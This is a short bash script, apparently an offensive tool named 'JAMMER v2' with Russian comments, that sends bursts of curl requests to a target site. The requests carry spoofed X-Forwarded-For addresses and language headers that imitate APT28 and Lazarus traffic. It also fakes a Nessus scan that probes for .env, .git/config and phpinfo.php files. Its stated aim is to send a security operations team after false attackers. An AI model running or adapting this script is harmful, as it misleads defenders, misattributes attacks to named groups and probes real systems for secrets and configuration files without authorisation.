#!/bin/bash
TARGET=$1
[ -z "$TARGET" ] && echo "Usage: $0 http://target.com" && exit 1

echo "[JAMMER v2] Intelligent smoke screen..."

# Имитация APT28
echo "[JAMMER] APT28 simulation..."
for i in {1..30}; do
    curl -sk --max-time 2 \
        -A "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0)" \
        -H "Accept-Language: ru-RU" \
        -H "X-Forwarded-For: 195.208.$((RANDOM%256)).$((RANDOM%256))" \
        "$TARGET/admin/login.aspx" -o /dev/null 2>/dev/null &
done

# Имитация Lazarus
echo "[JAMMER] Lazarus simulation..."
for i in {1..30}; do
    curl -sk --max-time 2 \
        -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/88.0" \
        -H "Accept-Language: ko-KP" \
        -H "X-Forwarded-For: 175.45.$((RANDOM%256)).$((RANDOM%256))" \
        "$TARGET/api/users" -o /dev/null 2>/dev/null &
done

# Имитация сканера Nessus
echo "[JAMMER] Nessus simulation..."
for i in {1..20}; do
    curl -sk --max-time 2 \
        -A "Nessus/10.0.0" \
        "$TARGET/.env" "$TARGET/.git/config" "$TARGET/phpinfo.php" \
        -o /dev/null 2>/dev/null &
done

wait
echo "[JAMMER v2] SOC now investigating APT28, Lazarus, and Nessus"
